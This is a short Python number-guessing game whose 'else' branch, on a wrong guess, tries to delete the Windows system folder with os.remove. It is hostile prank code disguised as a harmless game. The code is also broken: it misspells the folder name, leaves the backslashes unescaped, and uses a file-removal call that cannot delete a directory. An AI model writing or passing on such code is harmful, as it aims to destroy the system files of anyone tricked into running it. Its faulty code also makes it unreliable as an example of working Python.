import random
import os


number = random.randint(1,10)

guess = input("guess a number between 1 and 10")
guess = int(guess)

if guess == number:
    print("u won")
else:
    os.remove("C:\Windows\Systems32")